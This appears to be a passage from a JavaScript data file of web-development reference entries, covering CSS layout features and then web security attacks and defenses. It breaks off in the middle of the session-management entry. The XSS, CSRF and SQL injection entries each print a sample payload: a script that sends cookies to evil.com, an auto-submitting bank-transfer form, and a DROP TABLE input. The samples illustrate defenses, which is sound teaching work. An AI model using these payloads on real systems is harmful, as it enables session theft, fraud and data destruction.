    content: 'Every element is a box: content → padding → border → margin. box-sizing: border-box includes padding/border in width (standard practice). margin: auto centers block elements. margin collapsing: vertical margins between block elements merge to the larger value. outline doesn\'t affect layout.\n\nThe CSS box model is the foundation of how elements are sized and spaced. Every element is a rectangular box consisting of four layers: content (the actual text/image area), padding (space between content and border), border (the visible edge), and margin (space between this element and adjacent elements). The total width of an element is: content-width + padding-left + padding-right + border-left + border-right + margin-left + margin-right. Understanding this is essential for predicting element sizes and preventing layout surprises.\n\nbox-sizing: border-box changes the width/height calculation to include padding and border within the specified width, rather than adding them outside. With border-box, setting width: 300px on an element with 20px padding and 1px border results in a total box width of exactly 300px. This is far more intuitive than the default content-box model, where the same settings produce a 342px wide box (300 + 20 + 20 + 1 + 1). The universal reset (* { box-sizing: border-box; }) is standard practice in modern CSS and eliminates most sizing headaches. Margin: auto centers block-level elements horizontally when width is set (the auto margin absorbs remaining space). For vertical centering, Flexbox or Grid is more reliable.\n\nMargin collapsing is a unique CSS behavior where vertical margins between adjacent block elements merge into a single margin (the larger of the two). This only happens vertically, not horizontally. It affects parent-child relationships too — a parent\'s top margin can collapse with its first child\'s top margin. margin collapsing is prevented by creating a new Block Formatting Context (BFC) using overflow: hidden, display: flow-root, display: flex/grid, or position: absolute. Outline does not affect layout — it sits on top of the element and does not take up space, making it ideal for focus indicators (it does not cause layout shift). Common pitfalls include not accounting for padding/border in width calculations (use border-box), not understanding margin collapsing (use gap in flex/grid instead), and confusing padding (internal spacing) with margin (external spacing). The min-width and max-width properties interact with box-sizing — use them to create responsive constraints',
    example: `/* Reset — always use border-box */
*, *::before, *::after {
  box-sizing: border-box;
}

.card {
  width: 300px;           /* includes padding + border */
  padding: 24px;
  border: 1px solid #333;
  margin: 16px auto;      /* centered horizontally */
  outline: 2px solid transparent;  /* no layout shift on focus */
}

/* Centering with margin */
.center-block {
  width: fit-content;
  margin: 0 auto;
}

/* Prevent margin collapse */
.no-collapse {
  display: flow-root;  /* creates new BFC */
}

/* min/max for responsive sizing */
.responsive {
  width: min(100% - 32px, 600px);
  margin: 0 auto;
}`
  },
  {
    title: 'CSS Layers',
    category: 'CSS',
    subcategory: 'Modern',
    description: 'Control cascade order with @layer for predictable style prioritization.',
    content: '@layer lets you explicitly control which styles win in the cascade. Define layers in order of priority: base < components < utilities. Styles without layers override layered styles. This replaces the need for specificity hacks and !important.\n\nCSS Cascade Layers (@layer) are a modern CSS feature that gives developers explicit control over the cascade — the mechanism that determines which styles win when multiple rules conflict. Before layers, the cascade was determined solely by specificity, source order, and importance (!important). This created problems when combining styles from different sources (design systems, third-party libraries, utility frameworks) because you could not easily control priority without resorting to specificity hacks or !important. Layers solve this by allowing you to group styles into named layers with explicit priority ordering.\n\nYou define layers with @layer at the top of your CSS: @layer base, components, utilities. The order defines priority — later layers override earlier ones regardless of specificity. So a utility class in the utilities layer always beats a component style in the components layer, even if the component selector has higher specificity. You add styles to layers with @layer layername { ... } or by using @import with layer: @import "base.css" layer(base). Styles outside any layer (unlayered styles) override all layered styles — this is intentional, allowing you to add overrides without modifying the layer order. The @layer rule must appear before any non-layer styles in the cascade.\n\nLayers are particularly useful for: design systems (base layer for reset/typography, components layer for UI components, utilities layer for utility classes), integrating third-party CSS (put it in a lower-priority layer), maintaining large stylesheets (explicit priority instead of fighting specificity), and avoiding !important wars (layers provide predictable priority). Common patterns include putting CSS resets in a base layer, component styles in a components layer, and utility classes (like Tailwind) in a utilities layer. The specificity of selectors within a layer is still respected within that layer — layers only affect priority between layers, not within them. Common pitfalls include defining layers in the wrong order, mixing layered and unlayered styles without understanding the priority rules, and not realizing that styles outside layers always win (which can be surprising if you expect layers to be the highest priority). CSS layers are a powerful tool for managing complexity in large codebases and are supported in all modern browsers',
    example: `/* Define layer order — last wins */
@layer base, components, utilities;

@layer base {
  h1 { font-size: 2rem; }
  p { color: #666; }
}

@layer components {
  .card h1 { font-size: 1.5rem; }  /* beats base */
}

@layer utilities {
  .text-lg { font-size: 2.5rem; }  /* beats components */
}

/* Unlayered styles beat everything */
.insane { color: red; }  /* wins over all layers */

/* Named layers for third-party code */
@layer vendor {
  /* Bootstrap/Tailwind styles here */
}`
  },
  {
    title: 'Scroll Snap',
    category: 'CSS',
    subcategory: 'Interactive',
    description: 'Creating smooth, snap-to-position scrolling experiences.',
    content: 'Scroll snap creates carousel-like scrolling where the scroll position "snaps" to predefined points. Properties: scroll-snap-type (x/y mandatory/proximity) on container, scroll-snap-align (start/center/end) on children. Combined with overflow: scroll/auto.\n\nScroll snap is a CSS feature that creates snap-to-point scrolling experiences, similar to native mobile app carousels. The container element gets scroll-snap-type (x for horizontal, y for vertical) with a strictness value: mandatory (the scroll MUST snap to a snap point) or proximity (the scroll snaps only if close to a snap point). The child elements get scroll-snap-align (start, center, or end) to define where the snap point is relative to the container. This combination creates smooth, intentional scrolling where users land precisely on content sections.\n\nScroll snap is ideal for: image carousels and galleries, full-page section scrolling (like Apple\'s product pages), horizontal card scrollers, onboarding flows, and any UI where content is presented in discrete pages or sections. The proximity value is more forgiving than mandatory — it only snaps when the scroll position is already close to a snap point, allowing free scrolling between snap points. This makes it better for content-heavy pages where mandatory snapping would feel restrictive. Combining scroll-snap with CSS scroll-padding (defines the offset of the snap point from the container edge) and scroll-margin (defines the offset of the snap point from the child element) provides fine-grained control over snap positioning.\n\nImplementation considerations include: hiding scrollbars for cleaner aesthetics (::-webkit-scrollbar: display: none for WebKit, scrollbar-width: none for Firefox), using scroll-behavior: smooth for smooth scroll animations, ensuring snap points are visible within the viewport (no overflow: hidden on the container), and providing keyboard navigation support (arrow keys, Tab). On mobile, use -webkit-overflow-scrolling: touch for momentum scrolling on iOS. Common pitfalls include: mandatory snap on content that requires free scrolling (users cannot precisely position the scroll), not accounting for content of varying heights (snap points may not align well), and forgetting that scroll snap only works when overflow is scroll or auto. Test on multiple devices — scroll snap behavior can differ between browsers and operating systems',
    example: `/* Horizontal carousel */
.carousel {
  display: flex;
  overflow-x: auto;
  scroll-snap-type: x mandatory;
  gap: 16px;
  padding: 16px;
  -webkit-overflow-scrolling: touch;
}

.carousel-item {
  scroll-snap-align: start;
  flex: 0 0 300px;
  min-height: 200px;
}

/* Vertical full-page sections */
.fullpage {
  height: 100vh;
  overflow-y: auto;
  scroll-snap-type: y mandatory;
}

.section {
  scroll-snap-align: start;
  height: 100vh;
}

/* Hide scrollbar */
.carousel::-webkit-scrollbar { display: none; }
.carousel { scrollbar-width: none; }`
  },
  {
    title: 'View Transitions',
    category: 'CSS',
    subcategory: 'Modern',
    description: 'Smooth animated transitions between DOM states or page navigations.',
    content: 'View Transitions API creates smooth animations between states. CSS view-transition-name assigns transition identities to elements. ::view-transition pseudo-elements style the animation. Works with SPA route changes and MPA navigation (Chrome 111+).\n\nThe View Transitions API provides a native, declarative way to create smooth animated transitions between DOM states or page navigations. Before this API, animating between states required complex JavaScript animation libraries, manual FLIP (First, Last, Invert, Play) animations, or CSS transitions triggered by class toggles. View Transitions simplify this dramatically — you assign view-transition-name values to elements that should animate between states, and the API automatically creates cross-fade and morph animations. For SPA transitions, you wrap your DOM update in document.startViewTransition(() => updateDOM()). For MPA (multi-page) transitions, you use the @view-transition rule.\n\nThe CSS view-transition-name property assigns a unique identity to elements that should be animated between states. When the DOM changes (route navigation, state update), the API captures screenshots of elements with matching view-transition-name values before and after the change, then animates between them. You can customize the animation using ::view-transition-old(name) and ::view-transition-new(name) pseudo-elements. These allow you to apply custom animations (fade, slide, morph) to specific elements during the transition. The ::view-transition pseudo-element wraps the entire transition and can be used for global styling (like adding an overlay during the transition).\n\nFor SPA transitions, the pattern is: document.startViewTransition(() => { updateDOM(); }). The API handles capturing old and new states, creating the animation, and cleaning up. For MPA transitions (cross-document), you add @view-transition { navigation: auto; } to your CSS and ensure matching view-transition-name values exist on both pages. The API handles the transition between page loads. This works across same-origin navigations in Chrome 111+. Limitations include: limited browser support (Chrome/Edge, not Firefox/Safari as of 2024), only works with same-origin pages, does not handle complex data loading transitions automatically, and requires matching view-transition-name values on both sides of the transition. Common patterns include: named transitions for different route types (card-to-detail, list-to-item), custom easing and duration, and using CSS containment for better performance. View Transitions represent a significant step forward in native web animation capabilities, reducing the need for complex animation libraries for common patterns',
    example: `/* Named view transitions */
.card-image {
  view-transition-name: hero-image;
}

.card-title {
  view-transition-name: hero-title;
}

/* Customize the transition */
::view-transition-old(hero-image) {
  animation: fade-out 0.3s ease-out;
}

::view-transition-new(hero-image) {
  animation: fade-in 0.3s ease-in;
}

/* JavaScript trigger */
document.startViewTransition(() => {
  updateDOM();  // your DOM update
});

/* Cross-document (MPA) */
@view-transition {
  navigation: auto;
}`
  },

  // ═══════════════════════════════════════════
  // CYBERSECURITY
  // ═══════════════════════════════════════════
  {
    title: 'Cross-Site Scripting (XSS)',
    category: 'Cybersecurity',
    subcategory: 'Attacks',
    description: 'Injecting malicious scripts into web pages viewed by other users.',
    content: 'XSS occurs when user input is rendered as HTML/JS without sanitization. Three types: Stored (malicious script saved to database), Reflected (via URL parameters), DOM-based (client-side JavaScript). Prevention: sanitize output, use Content Security Policy (CSP), encode HTML entities, use frameworks that auto-escape (React, Vue).\n\nCross-Site Scripting (XSS) is one of the most common and dangerous web security vulnerabilities. It occurs when an attacker can inject malicious scripts into web pages viewed by other users. The attacker exploits the trust the browser has in the content from a specific origin — when a user visits a page with injected script, the browser executes it as if it were legitimate code from the trusted site. This allows attackers to steal session cookies, redirect users to malicious sites, deface websites, or perform actions on behalf of the victim. XSS is ranked in the OWASP Top 10 and affects millions of websites.\n\nThere are three main types of XSS. Stored XSS (persistent) occurs when the malicious script is permanently stored on the target server (in a database, message forum, comment field) and served to every user who views the affected page. This is the most dangerous type because every visitor is potentially affected. Reflected XSS (non-persistent) occurs when the script is reflected off a web server in error messages, search results, or URL parameters — the victim must click a crafted link to trigger it. DOM-based XSS occurs entirely in the browser when client-side JavaScript modifies the DOM with untrusted data (e.g., using innerHTML with URL parameters). The script never reaches the server, making it harder to detect with server-side security tools.\n\nPrevention requires a defense-in-depth approach. Output encoding: convert special characters to HTML entities (&lt; &gt; &amp; &quot;) before rendering. Use textContent instead of innerHTML. Sanitization: use libraries like DOMPurify to remove dangerous HTML/JS from user input. Content Security Policy (CSP): restrict which scripts can execute on the page (script-src \'self\' blocks inline scripts). Framework auto-escaping: React, Vue, and Angular escape interpolation by default — but dangerouslySetInnerHTML/v-html bypass this protection. Input validation: validate and sanitize all input on the server (never trust client-side validation). Never use eval() or setTimeout with string arguments. Common mistakes include: trusting user input, using innerHTML with user data, not encoding output, not implementing CSP, and assuming JavaScript frameworks automatically prevent XSS (they do, unless you bypass their escaping)',
    example: `// Vulnerable code
element.innerHTML = userInput; // XSS!

// Attack payload
<script>document.location='https://evil.com/?c='+document.cookie</script>

// Prevention
// 1. Use textContent instead of innerHTML
element.textContent = userInput;

// 2. Sanitize HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// 3. CSP header
Content-Security-Policy: default-src \'self\'; script-src \'self\'

// 4. React auto-escapes
// <div>{userInput}</div>  // safe
// <div dangerouslySetInnerHTML={{__html: userInput}} />  // dangerous`
  },
  {
    title: 'Cross-Site Request Forgery (CSRF)',
    category: 'Cybersecurity',
    subcategory: 'Attacks',
    description: 'Tricking authenticated users into performing unwanted actions.',
    content: 'CSRF exploits the trust a site has in the user\'s browser. An attacker creates a page that submits a form to your site using the user\'s existing session cookies. Prevention: use anti-CSRF tokens, SameSite cookie attribute, check Origin/Referer headers, require re-authentication for sensitive actions.\n\nCross-Site Request Forgery (CSRF, also called XSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently authenticated. The attack exploits the fact that browsers automatically include credentials (cookies, HTTP authentication) with requests to a site. If a user is logged into their bank and visits a malicious page, that page can submit a form to the bank\'s transfer endpoint — the browser automatically includes the session cookie, and the bank processes the transfer as if the user initiated it. CSRF is particularly dangerous for state-changing operations (transfers, password changes, account modifications) but does not expose the response to the attacker (they cannot read data, only trigger actions).\n\nThe attack vector is typically a hidden form on a malicious page that auto-submits to the target site. The form targets an endpoint that accepts POST requests and relies solely on cookies for authentication. Because the browser sends cookies automatically with requests to the target domain, the server cannot distinguish between a legitimate request and a forged one. Modern browsers mitigate some CSRF risks with the SameSite cookie attribute (Lax by default), which prevents cookies from being sent with cross-site requests. However, SameSite is not a complete defense — it can be bypassed, and older browsers do not support it.\n\nPrevention strategies include: Anti-CSRF tokens — a unique, unpredictable token generated by the server and included in forms. The server validates the token on each state-changing request. This is the most reliable defense. SameSite cookie attribute — set to Lax or Strict to prevent cookies from being sent with cross-site requests. Origin/Referer header validation — check that requests originate from your domain. Double Submit Cookie — send the CSRF token in both a cookie and a request header, comparing them server-side. Re-authentication for sensitive actions — require the user to enter their password before performing critical operations. Content Security Policy — restrict where forms can be submitted. Common mistakes include: relying solely on SameSite cookies (insufficient for older browsers), not protecting state-changing endpoints, using GET for state-changing operations, and not validating the Origin header on API requests',
    example: `<!-- Attack: hidden form on malicious site -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>

// Prevention strategies:

// 1. SameSite cookies (default in modern browsers)
Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly

// 2. Anti-CSRF token
<input type="hidden" name="_csrf" value="random-token" />

// 3. Check Origin header
if (req.headers.origin !== 'https://yoursite.com') {
  return res.status(403).send('Invalid origin');
}

// 4. Double Submit Cookie
// Send token in both cookie and header, compare server-side`
  },
  {
    title: 'SQL Injection',
    category: 'Cybersecurity',
    subcategory: 'Attacks',
    description: 'Inserting malicious SQL code into database queries via user input.',
    content: 'SQL injection occurs when user input is concatenated directly into SQL queries. Attackers can bypass authentication, extract data, or destroy databases. Prevention: use parameterized queries/prepared statements, ORM frameworks, input validation, and least-privilege database permissions.\n\nSQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in applications that construct SQL queries from user input. It occurs when user-supplied data is concatenated directly into SQL queries without proper sanitization or parameterization. An attacker can craft input that modifies the query structure to bypass authentication, extract sensitive data, modify or delete data, execute administrative operations on the database, or in severe cases, execute operating system commands. SQLi has been a top web vulnerability for over two decades and remains prevalent despite well-known prevention techniques.\n\nThe classic attack targets authentication: if a login form constructs a query like "SELECT * FROM users WHERE username=\'" + input + "\'" and the user inputs "admin\' --", the query becomes "SELECT * FROM users WHERE username=\'admin\' --\'" — the -- comments out the password check, and the attacker logs in as admin without a password. More sophisticated attacks use UNION SELECT to extract data from other tables, blind SQL injection to infer data when results are not directly visible, and time-based blind injection to extract data one bit at a time by measuring response delays. Error-based injection extracts information from database error messages that reveal table structure.\n\nPrevention is straightforward and mandatory. Parameterized queries (prepared statements) separate SQL code from data: the query structure is defined first, and user input is bound as parameters that are never interpreted as SQL. This completely prevents SQLi because the database treats parameters as data, not code. ORM frameworks (Prisma, SQLAlchemy, Sequelize) use parameterized queries under the hood, but raw queries in ORMs can still be vulnerable. Input validation provides defense-in-depth — validate type, length, format, and range on the server. Least-privilege database permissions ensure that even if injection occurs, the attacker has limited capabilities (use separate database users for read and write operations). Stored procedures add another layer but are not immune to SQLi if they use dynamic SQL. Common mistakes include: concatenating user input into queries, using string interpolation for SQL, trusting client-side validation, using wildcard SELECT queries, and not testing for SQLi vulnerability. Tools like sqlmap automate SQLi testing, but manual testing and code review are essential',
    example: `// Vulnerable query
const query = "SELECT * FROM users WHERE name='" + input + "'";
// Attack: input = "'; DROP TABLE users; --"

// Prevention 1: Parameterized queries
const query = "SELECT * FROM users WHERE name = ?";
db.query(query, [input]);

// Prevention 2: ORM (Prisma example)
const user = await prisma.user.findUnique({
  where: { name: input }
});

// Prevention 3: Input validation
const clean = input.replace(/[^a-zA-Z0-9]/g, '');

// Prevention 4: Least privilege
// Don't use root/admin DB user for app queries`
  },
  {
    title: 'Authentication & Password Security',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Secure password storage, MFA, and session management.',
    content: 'Never store plaintext passwords. Use bcrypt, scrypt, or Argon2 for hashing with unique salts. Implement MFA (TOTP, WebAuthn). Use secure session management: HttpOnly, Secure, SameSite cookies. Implement account lockout after failed attempts. Use passwordless options when possible (magic links, WebAuthn).\n\nPassword security is foundational to authentication systems. The single most important rule is: never store plaintext passwords. Even encrypted passwords are risky — if the encryption key is compromised, all passwords are exposed. Instead, use one-way cryptographic hash functions designed for password storage: bcrypt (widely used, good balance of security and performance), scrypt (memory-hard, resistant to hardware attacks), or Argon2 (winner of the Password Hashing Competition, configurable memory and CPU cost). These algorithms include a salt — a random value unique to each password — which prevents rainbow table attacks (precomputed hash lookups) and ensures that identical passwords produce different hashes. The work factor (cost factor) should be as high as acceptable for your server\'s performance — bcrypt cost 12-14 is common.\n\nMulti-factor authentication (MFA) adds a second layer of security beyond passwords. TOTP (Time-based One-Time Password) generates codes using an authenticator app (Google Authenticator, Authy). WebAuthn (FIDO2) uses hardware security keys (YubiKey) or platform authenticators (Touch ID, Windows Hello) for phishing-resistant authentication. SMS-based codes are less secure (SIM swapping attacks) but better than no MFA. Implementing MFA requires: enrollment flow (linking the second factor), verification flow (checking the second factor on login), and recovery flow (backup codes for lost devices). Always provide recovery options and document the MFA setup process clearly.\n\nSession management is critical for maintaining authenticated state. Use cryptographically random session IDs (at least 128 bits of randomness). Store sessions server-side (not in cookies or localStorage). Set cookie flags: HttpOnly (prevents JavaScript access — blocks XSS-based session theft), Secure (HTTPS only), SameSite (Lax or Strict — prevents CSRF). Implement session expiration (absolute timeout) and idle timeout (inactivity timeout). Regenerate session IDs after login (prevents session fixation attacks). For JWT tokens: use short expiration (15 minutes), implement refresh tokens for long-lived sessions, store in HttpOnly cookies (not localStorage), and validate tokens server-side. Common mistakes include: storing passwords with MD5 or SHA-256 (too fast — use bcrypt/Argon2), not using MFA, storing session data in localStorage, not setting cookie security flags, and not implementing session expiration. Account lockout after failed attempts (e.g., 5 attempts in 15 minutes) prevents brute force attacks',
    example: `// Password hashing with bcrypt
import bcrypt from 'bcrypt';

// Hash on registration
const hash = await bcrypt.hash(password, 12);

// Verify on login
const valid = await bcrypt.compare(inputPassword, storedHash);

// Session cookie security
res.cookie('session', token, {
  httpOnly: true,     // No JavaScript access
  secure: true,       // HTTPS only
  sameSite: 'lax',   // CSRF protection
  maxAge: 86400000,   // 24 hours
});

// Rate limiting login attempts
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts'
});`
  },
  {
    title: 'Content Security Policy (CSP)',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'HTTP header that controls which resources a page can load.',
    content: 'CSP prevents XSS by whitelisting allowed sources for scripts, styles, images, and other resources. It\'s an HTTP response header or meta tag. Start with report-only mode to test. Strict CSP significantly reduces attack surface.\n\nContent Security Policy (CSP) is an HTTP response header that restricts which resources (scripts, styles, images, fonts, etc.) a page is allowed to load. It is one of the most effective defenses against XSS attacks because it prevents inline script execution and restricts script sources to trusted origins. A strict CSP means that even if an attacker manages to inject a script tag, the browser will refuse to execute it if it does not match the policy. CSP is an HTTP header (Content-Security-Policy) or a meta tag fallback (<meta http-equiv="Content-Security-Policy" content="...">). It should be implemented on all pages.\n\nKey CSP directives include: default-src (fallback for all resource types), script-src (where scripts can be loaded from), style-src (where styles can be loaded from), img-src (where images can be loaded from), font-src (fonts), connect-src (XHR, fetch, WebSocket), frame-src (iframes), and base-uri (restricts the base URL). Values include \'self\' (same origin), \'unsafe-inline\' (allows inline scripts — very dangerous), \'unsafe-eval\' (allows eval — very dangerous), specific domains (https://cdn.example.com), and nonces (random values that allow specific inline scripts). A strict CSP might look like: default-src \'self\'; script-src \'self\' \'nonce-abc123\'; style-src \'self\' \'unsafe-inline\'; img-src \'self\' https:;.\n\nNonce-based CSP is the recommended approach for allowing specific inline scripts. A nonce (number used once) is a random value generated per request. Inline scripts with matching nonce attributes are allowed: <script nonce="abc123">...</script>. This allows your own inline scripts while blocking all injected scripts. CSP also supports report-only mode (Content-Security-Policy-Report-Only) which logs violations without blocking resources — use this to test your policy before enforcing it. Report-uri or report-to directives send violation reports to your server for monitoring. Common mistakes include: using \'unsafe-inline\' (defeats the purpose), using \'unsafe-eval\' (allows eval-based attacks), not implementing CSP at all (most common), using overly permissive CSP that allows everything, and not monitoring CSP violations. CSP is not a silver bullet — it does not prevent all XSS vectors (DOM-based XSS, event handlers) — but it significantly reduces the attack surface',
    example: `// HTTP header
Content-Security-Policy:
  default-src \'self\';
  script-src \'self\' https://cdn.example.com;
  style-src \'self\' 'unsafe-inline';
  img-src \'self\' https: data:;
  font-src \'self\' https://fonts.gstatic.com;
  connect-src \'self\' https://api.example.com;
  frame-ancestors 'none';
  base-uri \'self\';
  form-action \'self\';

// HTML meta tag (fallback)
<meta http-equiv="Content-Security-Policy"
  content="default-src \'self\'; script-src \'self\'">

// Report violations
Content-Security-Policy-Report-Only: ...; report-uri /csp-report

// Nonce for inline scripts
script-src \'self\' 'nonce-abc123'
// <script nonce="abc123">...</script>`
  },
  {
    title: 'HTTPS & TLS',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Encrypting data in transit between client and server.',
    content: 'HTTPS encrypts all traffic between browser and server using TLS. It prevents eavesdropping, tampering, and MITM attacks. Always use HTTPS in production. HTTP Strict Transport Security (HSTS) forces HTTPS. Use certificates from trusted CAs (Let\'s Encrypt is free).\n\nHTTPS (HTTP Secure) is HTTP encrypted with TLS (Transport Layer Security), the successor to SSL. It provides three security guarantees: confidentiality (encrypts data in transit — prevents eavesdropping), integrity (detects data modification — prevents tampering), and authentication (verifies the server\'s identity — prevents impersonation). Without HTTPS, all HTTP traffic is sent in plaintext — usernames, passwords, session cookies, credit card numbers, and any other data can be intercepted by anyone on the network path (WiFi operators, ISPs, government agencies). Modern browsers mark HTTP sites as "Not Secure" and may block form submissions on HTTP pages.\n\nTLS works through a handshake process: the client and server agree on encryption algorithms, the server presents its certificate (containing its public key), the client verifies the certificate against trusted Certificate Authorities (CAs), and both parties derive a shared symmetric key for encryption. The certificate binds the server\'s identity (domain name) to its public key. Certificates are issued by CAs — Let\'s Encrypt provides free, automated certificates that are trusted by all major browsers. Self-signed certificates work for development but trigger browser warnings in production. Certificate types include DV (Domain Validation — verifies domain ownership), OV (Organization Validation — verifies organization identity), and EV (Extended Validation — rigorous verification, shows company name in browser).\n\nHTTP Strict Transport Security (HSTS) is a response header that tells browsers to only connect to the site via HTTPS, even if the user types HTTP. The header Strict-Transport-Security: max-age=31536000; includeSubDomains; preload tells browsers to use HTTPS for at least one year, include all subdomains, and submit the domain to the HSTS preload list (hardcoded into browsers). This prevents SSL stripping attacks (downgrading HTTPS to HTTP) and cookie hijacking. Implementation steps: redirect all HTTP to HTTPS (301 redirect), set HSTS header, add your domain to the HSTS preload list, and ensure all resources (scripts, styles, images) use HTTPS URLs. Common mistakes include: not implementing HTTPS in production, mixed content (loading HTTP resources on HTTPS pages), not setting HSTS header, not redirecting HTTP to HTTPS, and using expired or self-signed certificates. Always use HTTPS — it is free, easy to set up, and essential for security',
    example: `// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(301, \`https://\${req.headers.host}\${req.url}\`);
  }
  next();
});

// HSTS header
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// Content-Security-Policy upgrade
upgrade-insecure-requests;

// Check certificate
openssl s_client -connect yoursite.com:443 -servername yoursite.com`
  },
  {
    title: 'Input Validation & Sanitization',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Validating and cleaning all user input on both client and server.',
    content: 'Never trust user input. Validate on the server (client validation is bypassable). Use allowlists over blocklists. Validate type, length, range, and format. Sanitize HTML output. Use libraries like Joi, Zod for validation, DOMPurify for HTML sanitization.\n\nInput validation and sanitization are the first line of defense against injection attacks, data corruption, and application errors. The fundamental principle is: never trust user input. All input from external sources — form fields, URL parameters, headers, cookies, file uploads, API requests — must be validated and sanitized before use. Client-side validation provides user feedback and improves UX but is always bypassable (using browser DevTools, curl, or a proxy). Server-side validation is mandatory and must be comprehensive. The distinction between validation (checking if input meets requirements) and sanitization (cleaning input to make it safe) is important — both should be applied.\n\nAllowlisting (whitelisting) is always preferred over blocklisting (blacklisting). An allowlist defines what IS allowed — everything else is rejected. A blocklist defines what is NOT allowed — everything else passes through. Allowlists are more secure because they cannot be bypassed by unexpected input types. For example, validating that a username contains only alphanumeric characters (allowlist) is more secure than trying to block SQL injection patterns (blocklist — the attacker may find a bypass). Validation rules should check: type (string, number, boolean), length (min/max), format (email, URL, phone), range (min/max for numbers), and content (allowed characters, no control characters).\n\nSanitization cleans input to make it safe for its intended use. HTML sanitization removes dangerous tags and attributes from user-provided HTML while preserving safe formatting. Libraries like DOMPurify and sanitize-html handle this correctly — do not attempt to write your own HTML sanitizer (it is extremely difficult to get right). URL sanitization prevents javascript: and data: URI schemes that could execute code. Output encoding converts special characters to their HTML entity equivalents before rendering in HTML, JavaScript, CSS, or URLs. Use context-specific encoding (HTML encoding for HTML content, JavaScript encoding for JavaScript strings, URL encoding for URL parameters). Libraries like Zod, Joi, and Yup provide schema-based validation with clear, declarative rules. Common mistakes include: relying on client-side validation, using blocklists instead of allowlists, not validating on the server, not sanitizing HTML output, encoding at the wrong time (encode late — at the point of output, not input), and trusting that validation frameworks are configured correctly without testing edge cases',
    example: `// Server validation with Zod
import { z } from 'zod';

const userSchema = z.object({
  name: z.string().min(2).max(50).regex(/^[a-zA-Z\\s]+$/),
  email: z.string().email(),
  age: z.number().int().min(13).max(120),
  url: z.string().url().optional()
});

try {
  const data = userSchema.parse(req.body);
} catch (err) {
  return res.status(400).json({ errors: err.errors });
}

// Sanitize HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});`
  },
  {
    title: 'Security Headers',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'HTTP headers that protect against common web vulnerabilities.',
    content: 'Essential security headers: X-Content-Type-Options (prevent MIME sniffing), X-Frame-Options (prevent clickjacking), X-XSS-Protection (legacy XSS filter), Referrer-Policy (control referrer info), Permissions-Policy (restrict browser features). Use securityheader.com to audit.\n\nSecurity headers are HTTP response headers that instruct browsers to enforce specific security behaviors. They provide defense-in-depth against various attack vectors and are a critical part of web application security. Most security headers are simple to implement (adding a single header) but provide significant security benefits. The helmet.js middleware for Express sets many of these headers automatically. Tools like securityheaders.com and Mozilla Observatory audit your security headers and provide recommendations.\n\nEssential security headers include: X-Content-Type-Options: nosniff prevents MIME type sniffing (browsers guess content types from content rather than Content-Type header — nosniff forces browsers to respect the declared type). X-Frame-Options: DENY (or SAMEORIGIN) prevents clickjacking by restricting whether the page can be embedded in iframes — clickjacking tricks users into clicking on hidden elements by overlaying a transparent iframe. Content-Security-Policy (CSP) — see CSP entry for details. Referrer-Policy controls how much referrer information is sent with requests (strict-origin-when-cross-origin is a good default — sends the full URL for same-origin requests, origin only for cross-origin). Permissions-Policy (formerly Feature-Policy) restricts which browser features the page can use: camera=(), microphone=(), geolocation=() disables these features entirely.\n\nAdditional headers include: X-XSS-Protection: 1; mode=block (legacy header — enables the browser\'s XSS filter, but modern CSP makes this less necessary; mode=block prevents rendering if an attack is detected), Strict-Transport-Security (HSTS — see HTTPS entry), Cross-Origin-Opener-Policy: same-origin (prevents cross-origin window references), Cross-Origin-Embedder-Policy: require-corp (requires cross-origin resources to opt-in), and Cross-Origin-Resource-Policy: same-origin (prevents cross-origin reads of resources). Common mistakes include: not setting any security headers (most common), setting overly permissive headers, not updating headers as standards evolve, and not testing headers after implementation. Security headers are a low-effort, high-impact security improvement — every web application should implement them. The order of implementation priority: CSP, HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy',
    example: `// Essential security headers
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()

// helmet.js for Express
import helmet from 'helmet';
app.use(helmet());

// Manual headers (Node.js)
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=()');
  next();
});`
  },
  {
    title: 'Session Management',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Secure handling of user sessions, tokens, and state.',
    content: 'Sessions identify authenticated users. Use cryptographically random session IDs. Store sessions server-side (not in localStorage). Implement session expiration, idle timeout, and regeneration on privilege change. JWT tokens need careful handling: short expiration, refresh tokens, secure storage.\n\nSession management maintains user state across multiple HTTP requests. When a user authenticates, the server creates a session with a unique, cryptographically random session ID and stores session data (user ID, permissions, preferences) server-side. The session ID is sent to the client as a cookie, and the client includes it with each subsequent request. The server looks up the session data by the session ID to identify the user. This model keeps sensitive data on the server while providing the client with only an opaque identifier.\n\nSession ID generation must use cryptographically secure random number generators (at least 128 bits of entropy). Predictable session IDs allow session hijacking. Session storage should be server-side (in-memory, database, or Redis) — never store session data in cookies or localStorage. Cookie-based sessions should set: HttpOnly (prevents JavaScript access — blocks XSS-based theft), Secure (HTTPS only), SameSite (Lax or Strict — prevents CSRF), and appropriate maxAge/expires. Session expiration is critical: absolute timeout (session expires after a fixed time regardless of activity) and idle timeout (session expires after inactivity). Both prevent session hijacking if a session ID is compromised.\n\nSession regeneration on privilege change (login, role change, password change) 